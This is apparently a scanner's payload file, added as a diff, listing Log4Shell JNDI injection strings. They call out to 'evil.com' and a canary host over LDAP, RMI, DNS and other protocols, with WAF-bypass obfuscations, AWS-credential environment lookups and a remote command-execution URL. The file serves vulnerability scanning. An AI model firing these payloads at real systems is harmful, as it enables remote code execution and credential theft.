@@ -1,0 +1,1290 @@
+{
+  "version": "5.1.0",
+  "category": "log4shell",
+  "payloads": [
+    {
+      "id": "log4shell.jndi.ldap_marker",
+      "vector": "${jndi:ldap://WSSc4n4ry7788.evil-webscanner-test.invalid/a}",
+      "description": "Baseline JNDI/LDAP lookup to a marker host (OOB confirmation).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "owasp": "A06:2021",
+      "canary": "evil-webscanner-test.invalid",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "oob": true,
+      "references": [
+        "https://github.com/0xsyr0/log4shell/blob/main/Payloads-Obfuscation-WAF-Bypass.md"
+      ],
+      "tags": [
+        "jndi",
+        "ldap"
+      ]
+    },
+    {
+      "id": "log4shell.jndi.dns_marker",
+      "vector": "${jndi:dns://WSSc4n4ry7788.evil-webscanner-test.invalid}",
+      "description": "DNS lookup variant — succeeds even when LDAP egress is blocked.",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "owasp": "A06:2021",
+      "canary": "evil-webscanner-test.invalid",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "oob": true,
+      "tags": [
+        "jndi",
+        "dns"
+      ]
+    },
+    {
+      "id": "log4shell.jndi.rmi_marker",
+      "vector": "${jndi:rmi://WSSc4n4ry7788.evil-webscanner-test.invalid/a}",
+      "description": "RMI transport variant.",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "owasp": "A06:2021",
+      "canary": "evil-webscanner-test.invalid",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "oob": true,
+      "tags": [
+        "jndi",
+        "rmi"
+      ]
+    },
+    {
+      "id": "log4shell.wafbypass.lower_lookup",
+      "vector": "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://WSSc4n4ry7788.evil-webscanner-test.invalid/a}",
+      "description": "Per-char ${lower:} nested lookups reassemble to 'jndi:ldap'.",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "owasp": "A06:2021",
+      "canary": "evil-webscanner-test.invalid",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "oob": true,
+      "waf_bypass": true,
+      "tags": [
+        "jndi",
+        "obfuscation"
+      ]
+    },
+    {
+      "id": "log4shell.wafbypass.default_lookup",
+      "vector": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://WSSc4n4ry7788.evil-webscanner-test.invalid/a}",
+      "description": "${::-X} default-value trick to smuggle the scheme past string matching.",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "owasp": "A06:2021",
+      "canary": "evil-webscanner-test.invalid",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "oob": true,
+      "waf_bypass": true,
+      "tags": [
+        "jndi",
+        "obfuscation"
+      ]
+    },
+    {
+      "id": "log4shell.wafbypass.mixed_case",
+      "vector": "${${lower:j}${upper:n}${lower:d}${upper:i}:ldap://WSSc4n4ry7788.evil-webscanner-test.invalid/a}",
+      "description": "Case-mixing lookups.",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "owasp": "A06:2021",
+      "canary": "evil-webscanner-test.invalid",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "oob": true,
+      "waf_bypass": true,
+      "tags": [
+        "jndi",
+        "obfuscation"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.03b29f06d2",
+      "vector": "${thread:id}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.04969a2e1f",
+      "vector": "${filename}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.0699792cd7",
+      "vector": "${env:AWS_SECRET_ACCESS_KEY}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.06ce6d66a9",
+      "vector": "${sys:os.name}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.0e83a0d6e1",
+      "vector": "${${lower:jndi}:${lower:ldap}://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.1319e15581",
+      "vector": "${k8s:namespaceId}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.1327f2ed4e",
+      "vector": "${${sys:java.version:-j}ndi:ldap://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.13b7f06561",
+      "vector": "${k8s:containerId}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.15260f8517",
+      "vector": "${jndi:ldap://evil.com/a}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "log4shell.legacy.194e0f10ac",
+      "vector": "${j${main:\\k5:-ND}i${spring:k5:-:}ldap://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.20c7818097",
+      "vector": "${java:hw}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.218f911ca4",
+      "vector": "${jndi:iiop://evil.com/a}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "log4shell.legacy.2590b224d1",
+      "vector": "${${java:version:-j}ndi:ldap://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.27471aa4e5",
+      "vector": "${jndi:ldap://evil.com:1389/a}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "log4shell.legacy.29cfe6f24d",
+      "vector": "${env:HOME}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.2a49198661",
+      "vector": "${docker:containerName}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.2dbb73882f",
+      "vector": "${thread:name}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.2f44cab0ad",
+      "vector": "${k8s:podName}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.30122cf386",
+      "vector": "${jndi:ldap://evil.com:389/a}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "log4shell.legacy.339f45e91f",
+      "vector": "${fqdn}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.37d7755918",
+      "vector": "${mdc:userId}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.3b166278c6",
+      "vector": "${j${env:AWS_PROFILE:-ND}i${env:AWS_REGION:-:}ldap://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.3d0cd05f9b",
+      "vector": "${env:AWS_ACCESS_KEY_ID}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.3f6e28daa7",
+      "vector": "${env:USER}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.436c75fd14",
+      "vector": "${java:version}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.43a03eb7c2",
+      "vector": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.452753e541",
+      "vector": "${${date:MM-dd-yyyy}}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.4706d86261",
+      "vector": "${sys:os.arch}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.478c7e5fc8",
+      "vector": "${marker:}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.4c7ff437a6",
+      "vector": "${k8s:accountName}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.4cd9254952",
+      "vector": "${thread:priority}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.4d90eabe88",
+      "vector": "${${lower:${lower:jndi}}:${lower:ldap}://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.4fa9f3f2f9",
+      "vector": "${k8s:clusterName}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.5233ea39d5",
+      "vector": "${lower:${jndi:ldap://evil.com/a}}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true,
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.543d247fa6",
+      "vector": "${j${sys:k5:-ND}i${lower:k5:-:}ldap://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.5bb1084355",
+      "vector": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.com/a}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true,
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.61c77a98b7",
+      "vector": "${k8s:imageId}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.62544805a9",
+      "vector": "${java:vm}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.66f51a6157",
+      "vector": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1389/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.687a61abca",
+      "vector": "${env:HOSTNAME}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.6b52c19cb8",
+      "vector": "${jndi:ldap://evil.com:1389/Basic/Command/Base64/Y2FsYw==}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "log4shell.legacy.6bbb89d833",
+      "vector": "${k8s:podId}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.6de9195bed",
+      "vector": "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.714b49b0ef",
+      "vector": "${env:PATH}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.7334c94acd",
+      "vector": "${jndi:dns://evil.com}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "log4shell.legacy.7bc71ff1f3",
+      "vector": "${jndi:${lower:rmi}://evil.com/a}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true,
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.834e1f56a6",
+      "vector": "${spring:spring.application.name}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.8750805663",
+      "vector": "${jndi:ldap://evil.com:1389/Exploit}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "log4shell.legacy.8adca6fc7a",
+      "vector": "${jn${env::-}di:ldap://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.8cacc7abf5",
+      "vector": "${jndi:ldap://127.0.0.1:1389/a}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "log4shell.legacy.8e056a2cdd",
+      "vector": "${docker:containerId}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.901460903a",
+      "vector": "${k8s:podIp}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.90f1402124",
+      "vector": "${jndi:corba://evil.com/a}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "log4shell.legacy.9402d26e81",
+      "vector": "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.961276f617",
+      "vector": "${base64:${jndi:ldap://evil.com/a}}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "log4shell.legacy.96bce53a31",
+      "vector": "${main:myApp}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.9d2646dc66",
+      "vector": "${date:MM-dd-yyyy}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.a1c58a078b",
+      "vector": "${jvmName}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.a1e85caef0",
+      "vector": "${sys:user.home}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.a22cd5f3a5",
+      "vector": "${${lower:jndi}:${lower:rmi}://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.a542d9bb6a",
+      "vector": "${hostName}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.a556448b09",
+      "vector": "${java:os}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.a9ec07d7be",
+      "vector": "${upper:${jndi:ldap://evil.com/a}}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true,
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.acf7368033",
+      "vector": "${${upper:jndi}:${upper:rmi}://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.af1da93027",
+      "vector": "${jndi:nds://evil.com/a}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "log4shell.legacy.b3aba19c10",
+      "vector": "${jndi:rmi://evil.com/a}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "log4shell.legacy.b5f277727e",
+      "vector": "${jndi:dns://evil.com/Exploit}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "log4shell.legacy.b736f411a4",
+      "vector": "${k8s:host}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.b761d342bc",
+      "vector": "${sys:java.vendor}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.b85fe1321f",
+      "vector": "${docker:imageName}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.bf60b29a7d",
+      "vector": "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.c1424e2a5e",
+      "vector": "${map:type}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.c6fcd37d9f",
+      "vector": "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}dap://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.c75ddf10ba",
+      "vector": "${${lower:jndi}:${lower:dns}://evil.com}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.ca16f9ad59",
+      "vector": "${k8s:containerName}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.cad5770014",
+      "vector": "${sys:user.name}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.d28bd4c3a9",
+      "vector": "${jndi:dns://evil.com/a}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "log4shell.legacy.d3793f0804",
+      "vector": "${k8s:labels}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.d60abcc8d7",
+      "vector": "${k8s:imageName}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.dd08fb966c",
+      "vector": "${ctx:loginId}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.e0a3545b24",
+      "vector": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://127.0.0.1:1389/a}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true,
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.e15b494341",
+      "vector": "${sys:java.version}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "log4shell.legacy.e3c53816a6",
+      "vector": "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://evil.com/a}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "log4shell.legacy.e5965d8b27",
+      "vector": "${jndi:rmi://evil.com:1099/Exploit}",
+      "description": "Imported from the legacy corpus (oob).",
+      "context": "oob",
+      "cwe": "CWE-502",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
